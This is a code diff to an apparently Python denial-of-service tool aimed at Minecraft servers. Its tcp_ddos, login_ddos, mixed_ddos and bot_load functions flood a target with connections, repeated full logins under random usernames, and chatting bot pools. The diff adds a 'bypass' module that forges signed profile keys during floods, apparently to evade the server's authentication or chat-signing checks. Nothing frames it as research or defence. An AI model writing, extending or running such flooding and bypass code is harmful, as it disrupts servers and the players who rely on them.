@@ -11,6 +11,7 @@ import time
 
 from .mcconn import MCConn, MCConnError
 from .bots import BotPool
+from . import bypass
 
 
 class Stats:
@@ -88,7 +89,8 @@ async def tcp_ddos(host, port, iterations=None, workers=20,
 
 
 async def login_ddos(host, port, version, workers=20,
-                     stop=None, stats=None, log=None):
+                     stop=None, stats=None, log=None,
+                     signed=False, share_key=True):
     """Repeated full logins. Expensive: runs full login handshake each time."""
     stats = stats or Stats()
     stop = stop or (lambda: False)
@@ -96,8 +98,10 @@ async def login_ddos(host, port, version, workers=20,
 
     async def worker():
         while not stop():
-            c = MCConn(host, port, username=f"L{random.randint(1, 99999)}",
-                       log=lambda *a: None)
+            nm = f"L{random.randint(1, 99999)}"
+            pk = bypass.make_profile_key(nm, share=share_key) if signed else None
+            c = MCConn(host, port, username=nm, log=lambda *a: None,
+                       profile_key=pk)
             try:
                 ok = await c.login(version, wait_play=False)
                 stats.add(ok, 3000 if ok else 500)
@@ -112,22 +116,27 @@ async def login_ddos(host, port, version, workers=20,
 
 
 def bot_load(host, port, version, count=20, proxy=None, online=False,
-             chat_every=8.0, log=None):
+             chat_every=8.0, log=None, signed=False, share_key=True,
+             offline_uuid=None):
     """Returns a running BotPool (keeps connections + chats)."""
     pool = BotPool(host, port, version, count=count, proxy=proxy,
-                   online=online, log=log, chat_every=chat_every)
+                   online=online, log=log, chat_every=chat_every,
+                   signed=signed, share_key=share_key,
+                   offline_uuid=offline_uuid)
     pool.spawn(count)
     pool.start_all()
     return pool
 
 
 async def mixed_ddos(host, port, version, workers=30, bot_count=10,
-                     stop=None, stats=None, log=None):
+                     stop=None, stats=None, log=None,
+                     signed=False, share_key=True):
     """Blend of ping + tcp + login + a small bot pool."""
     stats = stats or Stats()
     stop = stop or (lambda: False)
     log = log or (lambda *a: None)
-    pool = bot_load(host, port, version, count=bot_count, log=log)
+    pool = bot_load(host, port, version, count=bot_count, log=log,
+                    signed=signed, share_key=share_key)
 
     modes = ["ping", "ping", "tcp", "login"]
 
